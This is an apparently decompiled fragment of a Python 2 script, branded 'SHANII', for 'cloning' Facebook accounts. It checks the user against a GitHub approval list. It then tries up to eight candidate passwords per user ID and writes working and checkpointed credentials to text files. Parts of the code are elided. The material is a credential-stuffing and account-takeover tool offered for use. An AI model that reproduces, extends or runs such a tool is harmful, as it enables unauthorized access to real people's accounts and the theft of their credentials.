...
os.system('git pull')
os.system('clear')
logo = '\n\x1b[1;97m********************************************\n\x1b[1;93m      AUTHER    :     SHANII BRAND\n\x1b[1;96m      GITHUB    :     /Shahnoor-007\n\x1b[1;95m        Whats'App      :     +923402798893\n\x1b[1;94m         FB      :     /ShahNoor MiRani\n\x1b[1;97m *******************************************\n\x1b[1;98m          Send Id In Messenger For Approval\n\x1b[1;97m *******************************************\n'
...
def reg():
    ...
    r = requests.get('https://raw.githubusercontent.com/shahnoor-007/Mallah-Sahib/main/Approval.txt').text
    if to in r:
        ...
        print ''
        print ' \x1b[1;92mCopy token id and send to ShahNoor'
        print ''
...
def menu():
    ...
    os.system('clear')
    print logo
    tok = open('/sdcard/.SHANII.txt', 'r').read()
    print ''
...
def crack():
    ...
    print ''
    print '\x1b[1;92m[1] Public ID'Z Cloning'
...
def a_s():
    ...
    print ''
    print 47 * '-'
    print '\t\x1b[1;32mKing Of Facebook SHANII\x1b[0;97m'
    print 47 * '-'
    print ''
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'loc' in q:
                print '\x1b[1;92m[MIRANI-OK] ' + uid + ' | ' + pass1
                ok = open('/sdcard/ids/SHANII_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\x1b[1;93m[MIRANI-CP] ' + uid + ' | ' + pass1
                cp = open('SHANII_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                ...
                q = json.loads(data)
                if 'loc' in q:
                    print '\x1b[1;92m[MIRANI-OK] ' + uid + ' | ' + pass2
                    ok = open('/sdcard/ids/SHANII_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\x1b[1;93m[MIRANI-CP] ' + uid + ' | ' + pass2
                    cp = open('SHANII_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[1;92m[MIRANI-OK] ' + uid + ' | ' + pass3
                        ok = open('/sdcard/ids/SHANII_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\x1b[1;93m[MIRANI-CP] ' + uid + ' | ' + pass3
                        cp = open('SHANII_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[1;92m[MIRANI-OK] ' + uid + ' | ' + pass4
                            ok = open('/sdcard/ids/SHANII_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\x1b[1;93m[MIRANI-CP] ' + uid + ' | ' + pass4
                            cp = open('SHANII_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            ...
                            q = json.loads(data)
                            if 'loc' in q:
                                print '\x1b[1;92m[MIRANI-OK] ' + uid + ' | ' + pass5
                                ok = open('/sdcard/ids/SHANII_OK.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error']:
                                print '\x1b[1;93m[MIRANI-CP] ' + uid + ' | ' + pass5
                                cp = open('SHANII_CP.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                ...
                                q = json.loads(data)
                                if 'loc' in q:
                                    print '\x1b[1;92m[MIRANI-OK] ' + uid + ' | ' + pass6
                                    ok = open('/sdcard/ids/SHANII_OK.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error']:
                                    print '\x1b[1;93m[MIRANI-CP] ' + uid + ' | ' + pass6
                                    cp = open('SHANII_CP.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    ...
                                    q = json.loads(data)
                                    if 'loc' in q:
                                        print '\x1b[1;92m[MIRANI-OK] ' + uid + ' | ' + pass7
                                        ok = open('/sdcard/ids/SHANII_OK.txt', 'a')
                                        ok.write(uid + ' | ' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in q['error']:
                                        print '\x1b[1;93m[MIRANI-CP] ' + uid + ' | ' + pass7
                                        cp = open('SHANII_CP.txt', 'a')
                                        cp.write(uid + ' | ' + pass7 + '\n')
                                        cp.close()
                                        ...
                                        q = json.loads(data)
                                        if 'loc' in q:
                                            print '\x1b[1;92m[MIRANI-OK] ' + uid + ' | ' + pass8
                                            ok = open('/sdcard/ids/SHANII_OK.txt', 'a')
                                            ok.write(uid + ' | ' + pass8 + '\n')
                                            ok.close()
                                            oks.append(uid + pass8)
                                        elif 'www.facebook.com' in q['error']:
                                            print '\x1b[1;93m[MIRANI-CP] ' + uid + ' | ' + pass8
                                            cp = open('SHANII_CP.txt', 'a')
                                            cp.write(uid + ' | ' + pass8 + '\n')
                                            cp.close()
